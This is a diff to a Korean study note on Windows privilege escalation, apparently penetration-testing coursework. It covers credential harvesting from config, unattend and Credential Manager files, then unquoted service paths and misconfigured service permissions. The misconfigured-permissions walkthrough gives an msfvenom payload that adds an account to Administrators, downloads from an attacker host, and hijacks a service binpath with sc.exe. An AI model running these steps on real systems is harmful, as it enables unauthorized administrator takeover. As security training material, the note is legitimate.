@@ -142,6 +142,8 @@
   - 예시:
     ```
     tasklist /v | findstr java
+    ```
+    ```
     tasklist /svc
     ```
 - PowerShell: `ps`
@@ -174,9 +176,7 @@
 
 **5. 설치된 소프트웨어 확인**
 - 설치된 소프트웨어 확인
-  - `cd C:\`
-  - `dir`: 루트 디렉터리 내 주요 폴더 확인
-  - `cd "C:\Program Files"` 또는 `cd "C:\Program Files (x86)"` 후 `dir`: 설치된 프로그램 목록 확인
+  - `C:\`, `C:\Program Files`, `C:\Program Files (x86)` 경로에서 설치된 프로그램 목록 확인
 
 ---
 
@@ -228,10 +228,10 @@ C:\CouchDB\etc\default.ini
 - 설정 파일에서 패스워드 정보 직접 확인:
   ` cat C:\CouchDB\etc\local.ini | select-string passw `
 - 결과 :
-```
-admin = Password123!
-```
-CouchDB 패스워드 정보가 Password123! 임을 확인
+  ```
+  admin = Password123!
+  ```
+  CouchDB 패스워드 정보가 `Password123!` 임을 확인
 
 #### 🧪 히스토리파일 이용한 비밀 정보 수집 시나리오(PowerShell)**
 1. `Get-PSReadLineOption`
@@ -270,14 +270,14 @@ CouchDB 패스워드 정보가 Password123! 임을 확인
   New-ScheduledTaskAction [...] -u Administrator -p [...]
   ```
 - **주요 파일 위치**
-
-  C:\Windows\Panther\unattend.xml  
-  C:\Windows\Panther\unattended.xml  
-  C:\Windows\Panther\unattend\unattend.xml  
-  C:\Windows\Panther\unattend\unattended.xml
-  C:\Windows\System32\Sysprep\sysprep.inf  
-  C:\Windows\System32\Sysprep\sysprep.xml
-
+  ```
+    C:\Windows\Panther\unattend.xml  
+    C:\Windows\Panther\unattended.xml  
+    C:\Windows\Panther\unattend\unattend.xml  
+    C:\Windows\Panther\unattend\unattended.xml
+    C:\Windows\System32\Sysprep\sysprep.inf  
+    C:\Windows\System32\Sysprep\sysprep.xml
+  ```
 
 - **PowerShell을 활용한 검색 명령어**
   ```powershell
@@ -377,6 +377,8 @@ RunAs /savecred /u:Administrator "powershell.exe"
 Step 3. [참고] Credential 파일 직접 확인 및 암호화 상태 분석
 ```powershell
 cd C:\Users\redracoon\AppData\Roaming\Microsoft\Credentials
+```
+```powershell
 ls -Force
 ```
 - 위 명령어로 redracoon 사용자 계정의 Credential Manager 디렉토리 확인
@@ -399,8 +401,8 @@ Windows 환경에서 `Unquoted Service Path` 취약점은 **서비스 실행 파
   ```
 
 - 아래 두 조건을 **동시에 만족**하면 Unquoted Service Path 취약점이 발생합니다:
-- **ImagePath에 큰따옴표가 없음**
-- **경로에 공백이 존재함**
+  - **ImagePath에 큰따옴표가 없음**
+  - **경로에 공백이 존재함**
 
 #### ✅ 취약점 발생 원리
 
@@ -409,11 +411,16 @@ Windows 환경에서 `Unquoted Service Path` 취약점은 **서비스 실행 파
 
 예시:
 - 경로: `C:\Optional Programs\Red Raccoon\apache.exe`
+
+
 - 탐색 순서:
-1. `C:\Optional.exe` 실행 시도 (없으면 실패)
-2. `C:\Optional Programs\Red.exe` 실행 시도 (없으면 실패)
-3. `C:\Optional Programs\Red Raccoon\apache.exe` 실행 (존재 시 성공)
+  1. `C:\Optional.exe` 실행 시도 (없으면 실패)
+  2. `C:\Optional Programs\Red.exe` 실행 시도 (없으면 실패)
+  3. `C:\Optional Programs\Red Raccoon\apache.exe` 실행 (존재 시 성공)
+
+
 - **즉 디렉터리 이름에 공백이 존재하는 경우 공백 앞의 단어.exe를 바이너리 이름으로 인식하여 실행하게 됨**
+
 
 - 공격자는 이 로직을 악용해, 서비스 실행 시 우선 탐색되는 경로에 악성 파일(`C:\Optional.exe` 또는 `C:\Optional Programs\Red.exe`)을 배치
 
@@ -428,14 +435,16 @@ Step 1. 취약 서비스 탐지
 ```powershell
 Get-WmiObject Win32_Service | where-Object { $.StartMode -eq 'Auto' -and $.PathName -notlike 'C:\Windows*' -and $_.PathName -notmatch '^\s*"."\s$' } | Select-Object Name, DisplayName, PathName, StartMode
 ```
-- **설명**
+- **명령어 설명**
   - 시스템의 자동 시작 서비스 중, 실행 파일 경로가 `C:\Windows\` 하위가 아니고, 따옴표로 감싸지지 않은 서비스만 필터링
 
 - **예시 결과**
+  ```
   Name : Abyss Web Server
   DisplayName : Abyss Web Server
   PathName : C:\opt\Abyss Web Server\abyssws
   StartMode : Auto
+  ```
 
 → `C:\opt\Abyss Web Server\abyssws` 경로가 따옴표로 감싸지지 않고 공백이 포함되어 취약점 존재 확인
 
@@ -455,13 +464,13 @@ icacls C:\opt\
 Step 3. 공격 페이로드 생성 및 배포
 - **칼리 리눅스에서 페이로드 생성**
 
-```
-msfvenom -p windows/x64/exec CMD="net localgroup Administrators redraccoon /add" -f exe-service -o Abyss.exe
-```
-- `-p windows/x64/exec` : 명령 실행 페이로드
-- `CMD="net localgroup Administrators redraccoon /add"` : redraccoon 계정을 관리자 그룹에 추가
-- `-f exe-service` : 서비스 실행 파일 포맷 **(일반 exe와 다름, 서비스로 동작)**
-- `-o Abyss.exe` : 출력 파일명
+  ```
+  msfvenom -p windows/x64/exec CMD="net localgroup Administrators redraccoon /add" -f exe-service -o Abyss.exe
+  ```
+  - `p windows/x64/exec` : 명령 실행 페이로드
+  - `CMD="net localgroup Administrators redraccoon /add"` : redraccoon 계정을 관리자 그룹에 추가
+  - `-f exe-service` : 서비스 실행 파일 포맷 **(일반 exe와 다름, 서비스로 동작)**
+  - `-o Abyss.exe` : 출력 파일명
 
 
 - **공격 파일 배포**
@@ -476,13 +485,137 @@ msfvenom -p windows/x64/exec CMD="net localgroup Administrators redraccoon /add"
 
 Step 4. 서비스 재시작 및 권한 상승 확인
 - **서비스 재시작**
-```powershell
-Restart-Service Abyss Web Serve
-```
+  ```powershell
+  Restart-Service Abyss Web Server
+  ```
 
 - **권한 상승 확인**
-```powershell
-net localgroup Administrators
-```
+  ```powershell
+  net localgroup Administrators
+  ```
 
 - `redraccoon` 계정이 관리자 그룹에 추가되어 있으면 성공
+
+---
+
+### 5. 잘못된 서비스 권한 (Misconfigured Service Permissions)
+
+
+#### ✅ 개요
+- **정의:**  
+  특정 사용자에게 서비스 수정 권한이 부여되면, 서비스의 속성을 변경하거나 실행 파일을 교체하여 공격자의 코드를 실행 가능함
+
+- **공격 방식:**
+  - 서비스의 특성을 변경해 공격자의 페이로드 경로로 바꿀 수 있음
+  - 서비스 바이너리 파일 자체를 덮어씌어 공격자의 페이로드를 실행할 수 있음
+
+
+#### ✅ 서비스 권한 취약점 공격 2가지 유형
+
+1. **서비스 특성 수정 권한**
+- binPath의 파일 경로를 수정하여 페이로드 경로로 지정
+
+2. **서비스 바이너리 파일 쓰기 권한 이용**
+- 원래 존재하는 파일 위에 페이로드 덮어쓰기
+  ```powershell
+  cp --force <페이로드> <서비스파일>
+  ```
+- `<페이로드>`: 공격자가 실행시키고자 하는 파일
+- `<서비스파일>`: 기존 서비스 실행 파일 경로
+
+
+**⚠️실무 주의사항**
+- 실무에서는 사용 금지
+  - 고객 사전 허락 필수
+  - 백업 필수
+
+
+
+#### 🧪 잘못된 서비스 권한을 이용한 권한 상승 시나리오
+
+Step 1. 서비스 권한 정보 수집
+- 희생자에 accesschk.exe가 없다면,
+- **공격자(Kali)에서 다운로드**
+  ```
+  wget https://download.sysinternals.com/files/SysinternalsSuite.zip
+  unzip SysinternalsSuite.zip
+  python3 -m http.server 80
+  ```
+- **희생자에서 다운로드**
+  ```
+  wget http://<공격자IP>:80/accesschk.exe -OutFile accesschk.exe
+  ```
+
+- **권한 정보 확인**
+  ```powershell
+  accesschk.exe -accepteula -ucqv redraccoon AbysWebserver
+  ```
+  - **예시 결과**
+  ```
+  RW  AbysWebserver
+  SERVICE_ALL_ACCESS
+  ```
+  → `redraccoon` 유저는 AbysWebserver 서비스에 대해 모든 작업을 실행할 수 있음
+- `accesschk.exe`: Sysinternals에서 제공하는 권한 확인 도구
+- `-ucqv`: 사용자, 서비스, 권한 등 상세 정보 출력
+
+Step 2. AbysWebserver 서비스 binPath 확인
+```powershell
+sc.exe qc AbysWebserver
+```
+- **예시 결과**
+  ```
+  BINARY_PATH_NAME : C:\opt\Abyss Web Server\abyssws
+  ```
+  → AbysWebserver 서비스는 `C:\opt\Abyss Web Server\abyssws` 바이너리를 실행하는 것을 확인됨
+  현재 유저(redraccoon)은 AbysWebserver 서비스에 대해 모든 작업을 실행할 수 있기 때문에 경로를 바꿀 수 있음
+
+
+Step 3. 공격 페이로드 생성 및 배포
+- **칼리 리눅스에서 페이로드 생성**
+  ```
+  msfvenom -p windows/x64/exec CMD="net localgroup Administrators redraccoon /add" -f exe-service -o test.exe
+  ```
+  - `-p windows/x64/exec` : 명령 실행 페이로드
+  - `CMD="net localgroup Administrators redraccoon /add"` : redraccoon 계정을 관리자 그룹에 추가
+  - `-f exe-service` : 서비스 실행 파일 포맷 **(일반 exe와 다름, 서비스로 동작)**
+  - `-o Abyss.exe` : 출력 파일명
+
+
+- **공격 파일 배포**
+  - 칼리에서 웹서버 실행:
+  ```
+  python3 -m http.server 80
+  ```
+  - 희생자에서 다운로드:
+  ```
+  wget http://<공격IP>/test.exe -OutFile C:\opt\test.exe
+  ```
+
+Step 4. 서비스 실행 경로(binPath) 변경
+```powershell
+sc.exe config AbysWebserver binpath= "C:\Users\redraccoon\Desktop\test.exe"
+```
+- **⚠️주의:** `binpath=` 뒤에 반드시 공백이 있어야 함
+
+- 변경 확인
+  - ```powershell
+     sc.exe qc AbysWebserver
+     ```
+    BINARY_PATH_NAME이 페이로드 경로로 변경된 것 확인
+
+Step 5. 서비스 재시작 및 권한 상승 확인
+- **서비스 재시작**
+  ```powershell
+  Restart-Service AbysWebserver
+  ```
+
+- **권한 상승 확인**
+  ```powershell
+  net localgroup Administrators
+  ```
+
+- `redraccoon` 계정이 관리자 그룹에 추가되어 있으면 성공
+
+---
+
